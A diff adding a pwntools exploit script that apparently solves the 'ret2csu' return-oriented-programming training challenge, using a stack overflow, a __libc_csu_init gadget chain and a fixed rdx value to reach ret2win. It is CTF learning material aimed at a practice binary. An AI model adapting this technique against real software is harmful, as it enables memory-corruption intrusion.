@@ -1,0 +1,27 @@
+from pwn import *
+
+# command "info address __libc_csu_init" in gdb to find the func
+
+p = process("./ret2csu")
+e = ELF("./ret2csu")
+'''
+p = gdb.debug("./ret2csu", gdbscript = 
+b *__libc_csu_init+86
+)
+'''
+
+pop_rbx_rbp_r12_r13_r14_r15 = 0x000000000040089a
+win = e.symbols['ret2win']
+init_func_ptr = 0x600e38
+
+payload = b"A" * 0x20 + b"B" * 0x8
+payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
+payload += p64(0) + p64(1) + p64(init_func_ptr) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)
+payload += p64(0x0000000000400880)
+payload += p64(0) * 1 + p64(0) * 6 + p64(win)
+
+print(len(payload))
+
+p.sendlineafter(b"> ", payload)
+
+p.interactive()
